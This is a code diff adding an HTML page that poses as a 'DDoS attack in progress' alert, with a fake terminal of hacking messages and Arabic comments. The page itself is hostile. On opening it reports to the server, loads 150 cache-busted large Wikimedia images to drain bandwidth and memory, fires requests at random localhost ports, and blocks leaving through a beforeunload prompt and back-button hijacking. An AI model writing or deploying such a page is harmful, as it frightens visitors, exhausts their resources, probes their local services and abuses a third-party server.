@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NETWORK ATTACK DETECTED</title>
+<style>
+  body {
+    margin: 0; background: #000; color: #00ff00; font-family: monospace;
+    height: 100vh; overflow: hidden; padding: 20px; box-sizing: border-box;
+    text-shadow: 0 0 5px #00ff00;
+  }
+  .header { font-size: 24px; font-weight: bold; color: #ff0000; text-shadow: 0 0 10px #ff0000; margin-bottom: 20px; animation: blink 0.5s infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+  .terminal { width: 100%; height: 80vh; overflow-y: hidden; font-size: 12px; line-height: 1.2; display: flex; flex-direction: column-reverse; }
+  .line { margin: 2px 0; }
+  .red { color: #ff3333; }
+  .yellow { color: #ffff00; }
+  .stats { position: fixed; bottom: 20px; right: 20px; background: #111; border: 1px solid #ff0000; padding: 10px; color: #ff0000; font-weight: bold; text-align: right; }
+</style>
+</head>
+<body>
+
+<div class="header">⚠️ CRITICAL: DDOS ATTACK IN PROGRESS ⚠️</div>
+<div class="terminal" id="terminal"></div>
+
+<div class="stats">
+  PACKETS/SEC: <span id="pps">0</span><br>
+  NETWORK LOAD: <span id="load">0%</span>
+</div>
+
+<script>
+// إرسال إشعار للديسكورد إن الهجوم شغال
+fetch('/ddos-report', { method: 'POST' }).catch(()=>{});
+
+// 1. استنزاف الشبكة والرام (Network & Memory Flooding)
+async function floodNetwork() {
+  const targets = [
+    "https://upload.wikimedia.org/wikipedia/commons/3/3f/Fronalpstock_big.jpg",
+    "https://upload.wikimedia.org/wikipedia/commons/2/2c/Rotating_earth_%28large%29.gif",
+    "https://upload.wikimedia.org/wikipedia/commons/8/89/Portrait_Placeholder.png"
+  ];
+  
+  for (let i = 0; i < 150; i++) {
+    const img = new Image();
+    img.src = targets[i % targets.length] + "?v=" + Math.random();
+    
+    fetch('http://127.0.0.1:' + (8000 + Math.floor(Math.random() * 1000))).catch(()=>{});
+    fetch('http://localhost:' + (8000 + Math.floor(Math.random() * 1000))).catch(()=>{});
+  }
+}
+
+// 2. محاكي الاختراق المرعب
+const hexChars = "0123456789ABCDEF";
+function randomHex(len) {
+  let s = "";
+  for (let i = 0; i < len; i++) s += hexChars[Math.floor(Math.random() * 16)];
+  return s;
+}
+
+const logMessages = [
+  "Bypassing firewall...",
+  "Injecting payload into router...",
+  "Flooding port 80...",
+  "Flooding port 443...",
+  "Packet loss detected...",
+  "Connection to ISP lost...",
+  "Crashing DNS servers...",
+  "Stealing MAC address...",
+  "Router admin panel compromised...",
+  "Sending 10,000,000 requests per second...",
+  "SYN Flood initiated...",
+  "UDP Flood initiated...",
+  "HTTP GET Flood initiated..."
+];
+
+const terminal = document.getElementById('terminal');
+let packetCount = 0;
+let ppsEl = document.getElementById('pps');
+let loadEl = document.getElementById('load');
+
+setInterval(() => {
+  const line = document.createElement('div');
+  line.className = 'line';
+  
+  if (Math.random() > 0.7) {
+    line.innerHTML = `<span class="red">[ERR]</span> ${randomHex(16)} - ${logMessages[Math.floor(Math.random() * logMessages.length)]}`;
+  } else {
+    line.innerHTML = `<span class="yellow">[SYS]</span> ${randomHex(32)} ${randomHex(8)}`;
+  }
+  
+  terminal.prepend(line);
+  
+  if (terminal.childNodes.length > 100) {
+    terminal.removeChild(terminal.lastChild);
+  }
+
+  packetCount += Math.floor(Math.random() * 50000) + 10000;
+  ppsEl.innerText = packetCount.toLocaleString();
+  
+  let load = Math.floor(Math.random() * 20) + 80;
+  loadEl.innerText = load + "%";
+  
+  if (load > 95) loadEl.style.color = "#ff0000";
+
+}, 50);
+
+floodNetwork();
+
+window.addEventListener('beforeunload', function (e) {
+    e.preventDefault();
+    e.returnValue = '';
+});
+history.pushState(null, null, location.href);
+window.onpopstate = function () { history.go(1); };
+</script>
+</body>
+</html>
